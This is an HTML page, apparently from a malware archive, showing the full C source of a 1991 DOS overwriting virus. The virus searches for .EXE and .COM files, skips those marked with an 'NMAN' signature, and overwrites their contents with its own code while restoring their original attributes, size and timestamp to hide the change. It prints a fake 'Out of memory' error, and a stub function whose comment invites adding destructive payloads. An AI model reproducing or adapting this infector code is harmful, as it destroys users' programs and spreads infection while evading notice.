<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.HLLO.6286 - cvirus.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* C-Virus:  A generic .COM and .EXE infector
 
   Written by Nowhere Man
 
   Project started and completed on 6-24-91
 
   Written in Turbo C++ v1.00 (works fine with Turbo C v2.00, too)
*/</span><span class="sc0">
 
 
</span><span class="sc9">#pragma inline                              </span><span class="sc2">// Compile to .ASM
</span><span class="sc0"> 
</span><span class="sc9">#include 
#include 
#include 
#include 
#include 
</span><span class="sc0"> 
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">hostile_activity</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">spread</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">small_print</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">victim</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
 
 </span><span class="sc9">#define DEBUG
#define ONE_KAY   1024                      </span><span class="sc2">// 1k
</span><span class="sc9">#define TOO_SMALL ((6 * ONE_KAY) + 300)               </span><span class="sc2">// 6k+ size minimum
</span><span class="sc9">#define SIGNATURE "NMAN"                    </span><span class="sc2">// Sign of infection
</span><span class="sc0"> 
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* The main program */</span><span class="sc0">
 
    </span><span class="sc11">spread</span><span class="sc10">(</span><span class="sc11">_argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">victim</span><span class="sc10">());</span><span class="sc0">             </span><span class="sc2">// Perform infection
</span><span class="sc0">    </span><span class="sc11">small_print</span><span class="sc10">(</span><span class="sc6">"Out of memory\r\n"</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// Print phony error
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">                         </span><span class="sc2">// Fake failure...
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">hostile_activity</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* Put whatever you feel like doing here...I chose to
       make this part harmless, but if you're feeling
       nasty, go ahead and have some fun... */</span><span class="sc0">
 
    </span><span class="sc11">small_print</span><span class="sc10">(</span><span class="sc6">"\a\a\aAll files infected.  Mission complete.\r\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fname</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* This function determines if fname is infected */</span><span class="sc0">
 
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fp</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// File handle
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">];</span><span class="sc0">                       </span><span class="sc2">// Virus signature
</span><span class="sc0"> 
    </span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">28L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Signature for %s:  %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sig</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">strncmp</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SIGNATURE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sig</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">small_print</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">string</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* This function is a small, quick print routine */</span><span class="sc0">
 
    </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc0">
         </span><span class="sc11">mov</span><span class="sc0">  </span><span class="sc11">si</span><span class="sc10">,</span><span class="sc11">string</span><span class="sc0">
         </span><span class="sc11">mov</span><span class="sc0">  </span><span class="sc11">ah</span><span class="sc10">,</span><span class="sc4">0xE</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc11">print</span><span class="sc10">:</span><span class="sc0">   </span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">lodsb</span><span class="sc0">
         </span><span class="sc11">or</span><span class="sc0">   </span><span class="sc11">al</span><span class="sc10">,</span><span class="sc11">al</span><span class="sc0">
         </span><span class="sc11">je</span><span class="sc0">   </span><span class="sc11">finish</span><span class="sc0">
         </span><span class="sc16">int</span><span class="sc0">  </span><span class="sc4">0x10</span><span class="sc0">
         </span><span class="sc11">jmp</span><span class="sc0">  </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">print</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">finish</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc11">pop</span><span class="sc0">  </span><span class="sc11">si</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">spread</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">old_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">new_name</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* This function infects new_name with old_name */</span><span class="sc0">
 
 
    </span><span class="sc1">/* Variable declarations */</span><span class="sc0">
 
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">old</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">new</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// File handles
</span><span class="sc0">    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ftime</span><span class="sc0"> </span><span class="sc11">file_time</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc2">// Old file date,
</span><span class="sc11">time</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">attrib</span><span class="sc10">;</span><span class="sc0">                        </span><span class="sc2">// Old attributes
</span><span class="sc0">    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">old_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// Sizes of files
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virus_code</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc2">// Pointer to virus
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">old_handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new_handle</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// Handles for files
</span><span class="sc0"> 
 
    </span><span class="sc1">/* Perform the infection */</span><span class="sc0">
 
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Infecting %s with %s...\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">old_name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">old</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">old_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// Open virus
</span><span class="sc0">    </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// Open victim
</span><span class="sc0">    </span><span class="sc11">old_handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">old</span><span class="sc10">);</span><span class="sc0">               </span><span class="sc2">// Get file handles
</span><span class="sc0">    </span><span class="sc11">new_handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">new</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">old_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filelength</span><span class="sc10">(</span><span class="sc11">new_handle</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// Get old file size
</span><span class="sc0">    </span><span class="sc11">virus_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filelength</span><span class="sc10">(</span><span class="sc11">old_handle</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">// Get virus size
</span><span class="sc0">    </span><span class="sc11">attrib</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_chmod</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">           </span><span class="sc2">// Get old attributes
</span><span class="sc0">    </span><span class="sc11">getftime</span><span class="sc10">(</span><span class="sc11">new_handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">file_time</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// Get old file time
</span><span class="sc0">    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">new</span><span class="sc10">);</span><span class="sc0">                       </span><span class="sc2">// Close the virusee
</span><span class="sc0">    </span><span class="sc11">_chmod</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">                 </span><span class="sc2">// Clear any read-only
</span><span class="sc0">    </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">);</span><span class="sc0">                  </span><span class="sc2">// Erase old file
</span><span class="sc0">    </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// Open new virus
</span><span class="sc0">    </span><span class="sc11">new_handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">new</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">virus_code</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">virus_size</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// Allocate space
</span><span class="sc0">    </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">virus_code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">old</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// Read virus from old
</span><span class="sc0">    </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">virus_code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">// Copy virus to new
</span><span class="sc0">    </span><span class="sc11">_chmod</span><span class="sc10">(</span><span class="sc11">new_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">attrib</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// Replace attributes
</span><span class="sc0">    </span><span class="sc11">chsize</span><span class="sc10">(</span><span class="sc11">new_handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">old_size</span><span class="sc10">);</span><span class="sc0">           </span><span class="sc2">// Replace old size
</span><span class="sc0">    </span><span class="sc11">setftime</span><span class="sc10">(</span><span class="sc11">new_handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">file_time</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// Replace old time
</span><span class="sc0"> 
 
    </span><span class="sc1">/* Clean up */</span><span class="sc0">
 
    </span><span class="sc11">fcloseall</span><span class="sc10">();</span><span class="sc0">                       </span><span class="sc2">// Close files
</span><span class="sc0">    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">virus_code</span><span class="sc10">);</span><span class="sc0">                  </span><span class="sc2">// Free memory
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">victim</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* This function returns the virus's next victim */</span><span class="sc0">
 
 
    </span><span class="sc1">/* Variable declarations */</span><span class="sc0">
 
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">types</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"*.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.COM"</span><span class="sc10">};</span><span class="sc0">          </span><span class="sc2">// Potential victims
</span><span class="sc0">    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// DOS file block
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">done</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// Indicates finish
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc2">// Used for loop
</span><span class="sc0"> 
 
    </span><span class="sc1">/* Find our victim */</span><span class="sc0">
 
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">_argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">_argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0">
         </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">_argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">index</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">types</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">done</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">findfirst</span><span class="sc10">(</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">index</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ffblk</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FA_RDONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FA_HIDDEN</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
</span><span class="sc11">FA_SYSTEM</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FA_ARCH</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">done</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">              </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Scanning %s...\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc10">.</span><span class="sc11">ff_name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">              </span><span class="sc1">/* If you want to check for specific days of the week,
                 months, etc., here is the place to insert the
                 code (don't forget to "#include "!) */</span><span class="sc0">
 
              </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((!</span><span class="sc11">infected</span><span class="sc10">(</span><span class="sc11">ffblk</span><span class="sc10">.</span><span class="sc11">ff_name</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ffblk</span><span class="sc10">.</span><span class="sc11">ff_fsize</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0">
</span><span class="sc11">TOO_SMALL</span><span class="sc10">))</span><span class="sc0">
                   </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">ffblk</span><span class="sc10">.</span><span class="sc11">ff_name</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc11">done</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">findnext</span><span class="sc10">(&amp;</span><span class="sc11">ffblk</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
 
 
    </span><span class="sc1">/* If there are no files left to infect, have a little fun... */</span><span class="sc0">
 
    </span><span class="sc11">hostile_activity</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">                         </span><span class="sc2">// Prevents warning
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
